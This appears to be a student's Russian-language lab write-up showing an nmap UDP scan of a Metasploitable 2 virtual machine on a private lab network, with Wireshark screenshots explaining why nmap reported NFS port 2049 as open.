```bash
┌──(kali㉿makhota-kali)-[~]
└─$ sudo nmap -sU 192.168.56.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 11:35 EDT
Stats: 0:00:04 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 3.46% done; ETC: 11:45 (0:10:15 remaining)

Nmap scan report for 192.168.56.110
Host is up (0.00071s latency).
Not shown: 993 closed udp ports (port-unreach)
PORT     STATE         SERVICE
53/udp   open          domain
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
111/udp  open          rpcbind
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
2049/udp open          nfs
MAC Address: 08:00:27:86:01:1F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1071.07 seconds

```

Через wireshark смотрим что происходило на открытом порту 2049

![UDP2049запрос](img/img%202023-03-25%20191252.png)


![UDP2049ответ](img/img%202023-03-25%20191915.png)


`nmap` сканирует  порт  2049 по протоколу UDP  vm `Metasploitable 2` 
1) vm `kali` отправляет UDP-пакет. 
2) vm `Metasploitable 2` отправляет UDP-пакет на vm `kali` `nmap` на основании этого ответа делает вывод о том, что порт 2049 для соединения по протоколу UDP открыт.
vm `Metasploitable 2`  не отправляет обратный echo-запрос ICMP с порта 2049. 



Использованные источники:
- https://nmap.org/man/ru/man-port-scanning-techniques.html 
- https://habr.com/ru/post/131433/
- https://www.8host.com/blog/osnovy-nmap-tipy-skanirovaniya-i-flagi/?ysclid=lfo3m39yl9301490226